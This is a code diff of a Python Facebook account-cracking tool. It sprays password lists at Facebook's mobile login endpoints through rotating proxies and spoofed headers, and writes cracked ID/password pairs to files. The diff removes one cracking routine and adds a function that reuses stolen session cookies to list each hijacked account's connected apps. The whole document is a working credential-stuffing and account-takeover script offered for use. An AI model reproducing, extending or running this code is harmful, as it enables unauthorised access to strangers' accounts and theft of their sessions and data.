@@ -691,7 +691,7 @@ def crack(idf,pwv):
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 
-                print ('\x1b[36m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
+                #print ('\x1b[36m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
                 #print(f'\r\033[0;93m[\33[1;96mNAKRETAUA[😅]\33[1;93m]  {idf}  {pw} ')
                 print ('\x1b[36m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
@@ -702,10 +702,11 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print ('\x1b[32m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
+                #print ('\x1b[32m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
                 print(f'\r\x1b[32[𝐑𝐀𝐖𝐀-𝐎𝐊]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
                 print ('\x1b[32m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
+		cek_SURCHY(kuki)
                 
                 break
                 
@@ -715,75 +716,30 @@ def crack(idf,pwv):
             time.sleep(31)
     loop+=1
  
-#------------------[ METHODE-MBASIC-2 ]-------------------#
- 
-def crackfree(idf,pwv):
-    global loop,ok,cp
-    sys.stdout.write(f"\r{H}\x1b[33m[\x1b[32m3ALA\x1b[33m]{P} \x1b[33m[{H}{loop}{P}\x1b[33m]{P} \x1b[33m[{H}{len(id)}{P}\x1b[33m] \x1b[33m[\x1b[32mOK/\x1b[36mCP\x1b[33m] \x1b[33m[\x1b[32m{ok}/\x1b[36m{cp}\x1b[33m] \x1b[33m[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}\x1b[33m]  "),
-    sys.stdout.flush()
-    ua = random.choice(ugen)
-    ua2 = random.choice(ugen2)
-    ses = requests.Session()
-    for pw in pwv:
-        try:
-            nip=random.choice(prox)
-            proxs= {'http': 'socks4://'+nip}
-            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
-            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-            koki+=' m_pixel_ratio=2.625; wd=412x756'
-            heade = {'authority': 'm.facebook.com',
-    'method': 'GET',
-	'scheme': 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'max-age=0',
-    'content-type':'application/x-www-form-urlencoded',
-    'origin':'https://m.facebook.com',
-    'referer': 'https://m.facebook.com/',
-    'dpr': '2.75',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': ua,
-    'viewport-width': '980',
-}
-            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
-            if "checkpoint" in po.cookies.get_dict().keys():
-                print ('\x1b[36m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
-                print(f'\r\033[0;93m[\33[1;96mCHECK\33[1;93m]  {idf}  {pw} ')
-                print ('\x1b[36m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
-                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
-                akun.append(idf+' • '+pw)
-                cp+=1
-                break
-            elif "c_user" in ses.cookies.get_dict().keys():
-                ok+=1
-                coki=po.cookies.get_dict()
-                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print ('\x1b[32m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
-                print(f'\r\33[1;93m[\33[1;92mSUCCES\33[1;93m] \33[1;92m{idf} {pw} ')
-                print ('\x1b[32m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
-                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
-                break
-                
-            else:
-                continue
-        except requests.exceptions.ConnectionError:
-            time.sleep(31)
-    loop+=1
+
  
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
+
+def cek_SURCHY(kuki):
+ session = requests.Session()
+ w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+ sop = bs4.BeautifulSoup(w,"html.parser")
+ x = sop.find("form",method="post")
+ game = [i.text for i in x.find_all("h3")]
+ try:
+  for i in range(len(game)):
+   print ("\r%s  \033[0m  %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+ except AttributeError:
+  print ("\r    %s\033[0m cookie invalid"%(M))
+ w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+ sop = bs4.BeautifulSoup(w,"html.parser")
+ x = sop.find("form",method="post")
+ game = [i.text for i in x.find_all("h3")]
+ try:
+  for i in range(len(game)):
+   print ("\r%s  \033[0m  %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+ except AttributeError:
+  print ("\r    %s \033[0mcookie invalid"%(M))
  
 if __name__=='__main__':
     try:os.mkdir('OK')
